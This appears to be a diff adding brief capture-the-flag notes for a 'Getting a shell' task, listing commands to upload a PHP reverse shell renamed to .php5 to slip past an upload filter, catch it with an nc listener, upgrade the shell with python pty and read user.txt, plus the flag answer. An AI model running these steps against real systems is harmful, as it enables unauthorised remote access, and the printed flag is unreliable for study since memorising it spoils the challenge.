@@ -1,0 +1,18 @@
+
+							   Getting a shell
+							 ====================
+
+
+1. user.txt
+ans: THM{y0u_g0t_a_sh3ll}
+command: cp /root/Documents/scripts/pentest_monkey_shells/php_reverse_shell.php . (shell is in my directory)
+command: nano php_reverse_shell.php
+command: mv php_reverse_shell.php php_reverse_shell.php5  (change file extention)
+	 (upload file in {ip}/panel)
+command: nc -nvlp 4444	
+	 (then go {ip}/uploads and open uploaded file)
+command: which python
+command: python -c 'import pty;pty.spawn("/bin/bash")'
+command: cd /var/www
+command: ls
+command: cat user.txt
